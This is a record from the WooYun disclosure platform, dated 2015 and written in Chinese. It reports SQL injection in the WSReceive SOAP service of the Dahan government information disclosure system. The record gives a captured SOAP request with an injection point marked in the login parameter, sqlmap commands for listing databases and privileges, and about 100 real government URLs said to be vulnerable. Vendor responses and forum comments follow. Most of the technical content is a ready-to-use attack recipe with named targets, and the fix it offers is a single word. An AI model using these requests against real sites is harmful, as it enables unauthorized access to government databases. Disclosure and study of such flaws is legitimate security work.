{"id": 27303, "wybug_id": "wooyun-2015-0102002", "wybug_title": "大汉政府信息公开多处SQL注入二(附100个案例)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-03-18 06:51", "wybug_open_date": "2015-06-21 06:53", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-23：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向公众公开  简要描述： 大汉政府信息公开多处SQL注入二(附100个案例) 详细说明：  依然是webservice漏洞，漏洞存在于/xxgk/services/WSReceive?wsdl 该WSReceive服务的多个方法，多个参数存在严重漏洞，且该漏洞普遍存在。wsGetWebgetClientIpAxiswsGetColumnwsGetColumnStylewsGetColumnTotalNumberwsGetColumnTotalNumberExtendwsGetInfosBase64wsGetInfoswsGetInfosExtendwsGetInfosExtendBase64wsGetInfosByIdsBase64wsGetInfosByIdswsGetCountByColumnwsGetSubInfoswsGetAllInfosBase64wsGetAllInfoswsGetAllInfosByIdsBase64wsGetAllInfosByIdswsSyncGetInfoswsSyncGetInfoswsGetSyncColumnswsSyncSuccessedwsSyncDeletewsGetSubCatalogs上述方法的多个参数均存在漏洞，随便选取一个方法进行测试/xxgk/services/WSReceive?wsdl wsGetAllInfos方法（/xxgk/services/WSReceive?wsdl || /gov/services/WSReceive?wsdl）用WSockExpert v0.7抓包，并保存为wooyun.txt\nPOST /xxgk/services/WSReceive?wsdl HTTP/1.1Accept-Encoding: gzip,deflateContent-Type: text/xml;charset=UTF-8SOAPAction: \"\"Content-Length: 222Host: xxgk.lyg.gov.cnConnection: Keep-AliveUser-Agent: google robots<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.blf.jcms\">   <soapenv:Header/>   <soapenv:Body>      <web:wsGetAllInfos soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">         <nCataId xsi:type=\"xsd:int\">1</nCataId>         <bLink xsi:type=\"xsd:int\">2</bLink>         <nStart xsi:type=\"xsd:int\">3</nStart>         <nEnd xsi:type=\"xsd:int\">4</nEnd>         <strLoginId xsi:type=\"xsd:string\">5*</strLoginId>         <strPwd xsi:type=\"xsd:string\">6</strPwd>         <strKey xsi:type=\"xsd:string\">7</strKey>      </web:wsGetAllInfos>   </soapenv:Body></soapenv:Envelope>\n该漏洞可以直接用SQLMAP跑出的数据sqlmap.py -r wooyun.txtwww.gs.gov.cn\n\nsqlmap.py -r wooyun.txt --current-db --privilege\n\nxxgk.lyg.gov.cnsqlmap.py -r wooyun.txt\n\nsqlmap.py -r wooyun.txt --current-db --dbs\n\n由于该漏洞普遍存在，为证明漏洞的危害，列举100个案例：http://xxgk.zjds.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.taixing.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.jining.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.xxgk.lg.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.jinhua.gov.cn/xxgk/services/WSReceive?wsdlhttp://gongkai.sd-n-tax.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.wenzhou.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.jsgs.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.nbjiangbei.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.sdxm.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.changde.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.gygov.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.longwan.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.cqyc.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.gaomi.gov.cn:82/xxgk/services/WSReceive?wsdlhttp://www.huzhou.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.zaozhuang.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.lucheng.gov.cn/xxgk/services/WSReceive?wsdlhttp://zfxxgk.weihai.gov.cn/xxgk/services/WSReceive?wsdlhttp://218.94.123.47/xxgk/services/WSReceive?wsdlhttp://xxgk.yiyuan.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.zhucheng.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.nanxun.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.xiaogan.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.zibo.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.lyg.gov.cn/xxgk/services/WSReceive?wsdlhttp://211.138.126.163/xxgk/services/WSReceive?wsdlhttp://xxgk.wencheng.gov.cn/xxgk/services/WSReceive?wsdlhttp://zfxxgk.liaocheng.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.jsforestry.gov.cn/xxgk/services/WSReceive?wsdlhttp://60.190.68.201:7001/xxgk/services/WSReceive?wsdlhttp://xxgk.shizhong.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.gzlps.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.jingning.gov.cn/xxgk/services/WSReceive?wsdlhttp://blxxgk.bl.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.qingzhou.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.panxian.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.dongtai.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.shanghe.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.cncn.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.gzwd.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.hzgjj.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.siyang.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.zjwy.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.tianqiao.gov.cn/xxgk/services/WSReceive?wsdlhttp://218.2.208.145/xxgk/services/WSReceive?wsdlhttp://xxgk.jc.gansu.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.wzrc.net/xxgk/services/WSReceive?wsdlhttp://xxgk.hbjs.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.jiangyan.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.jingjiang.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.changle.gov.cn:82/xxgk/services/WSReceive?wsdlhttp://xxgk.szzj.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.stats-sd.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.hg.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.zjdlr.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.yj.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.yqjq.gov.cn/xxgk/services/WSReceive?wsdlhttp://zfxxgk.heze.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk3.nantong.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.jsgl.cn/xxgk/services/WSReceive?wsdlhttp://www.zjch.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.yidu.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.jsmuseum.com/xxgk/services/WSReceive?wsdlhttp://www.77778.com/xxgk/services/WSReceive?wsdlhttp://xxgk.pingyin.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.jshb.net/xxgk/services/WSReceive?wsdlhttp://zfxxgk.seac.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.tx.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.dejiang.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.yq.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.ec.js.edu.cn/xxgk/services/WSReceive?wsdlhttp://www.njzj.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.zjpy.gov.cn/xxgk/services/WSReceive?wsdlhttp://www.gaoqing.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.czzl.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.liuzhi.gov.cn/xxgk/services/WSReceive?wsdlhttp://xxgk.sx.gov.cn/xxgk_public/services/WSReceive?wsdlhttp://xxgk.10.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.ycxl.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.changyang.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.haiyan.gov.cn/gov/services/WSReceive?wsdlhttp://open.jiashan.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.yichang.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.dyq.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.xingshan.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.kuiwen.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.hbwf.gov.cn/gov/services/WSReceive?wsdlhttp://www.wuxing.gov.cn/gov/services/WSReceive?wsdlhttp://61.159.149.203:9080/gov/services/WSReceive?wsdlhttp://xxgk.dianjun.gov.cn/gov/services/WSReceive?wsdlhttp://211.138.126.163:7003/gov/services/WSReceive?wsdlhttp://xxgk.zrt.gov.cn/gov/services/WSReceive?wsdlhttp://220.191.221.136/gov/services/WSReceive?wsdlhttp://119.191.58.141/gov/services/WSReceive?wsdlhttp://zfxxgk.dongying.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.hbdy.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.yuanan.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.lijin.gov.cn/gov/services/WSReceive?wsdlhttp://xxgk.sdfda.gov.cn/gov/services/WSReceive?wsdl   漏洞证明：  SQLMAP直接跑出数据：\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-21 06:53 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-18 08:53 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  100个案例- -#    \n     2015-03-18 09:29 |    \t\tLeadUrLife \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:14        | 好好学习 天天向上)\t\t \n  100个案例- -#    \n     2015-03-18 09:31 |    \t\t浮世浮城 \t\t\t( 普通白帽子  |\t\t\t        Rank:284 漏洞数:60        | 我存于这俗世烟火的浮世，我爱这时光倒影的...)\t\t \n  100个案例- -#    \n     2015-03-18 09:40 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:7        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区欢迎您...)\t\t \n  100个案例- -#     \n     2015-03-18 09:55 |    \t\t小虾米 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 刚开始学习安全的一名学生，希望可以快速的...)\t\t \n  100个案例- -#     \n     2015-06-21 09:11 |    \t\tAll \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 碰巧进乌云的小菜，)\t\t \n  100个案例- -#    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}